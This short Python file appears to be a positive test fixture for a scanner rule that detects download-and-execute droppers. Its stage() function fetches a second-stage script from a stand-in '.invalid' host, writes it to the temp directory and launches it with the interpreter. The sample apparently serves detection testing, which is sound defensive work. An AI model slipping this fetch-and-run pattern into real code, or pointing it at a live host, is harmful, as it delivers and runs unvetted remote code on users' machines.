"""PHX-DRP-002 positive (ADR-031): the downloaded script is written through a handle that is
never named -- `open(p, "w").write(body)` -- and then run with the interpreter.
Inert: the host is under `.invalid`.
"""
import os
import subprocess
import sys
import tempfile
import urllib.request


def stage():
    body = urllib.request.urlopen("https://cdn.example.invalid/stage2.py").read().decode()
    p = os.path.join(tempfile.gettempdir(), "stage2.py")
    open(p, "w").write(body)
    subprocess.Popen([sys.executable, p])
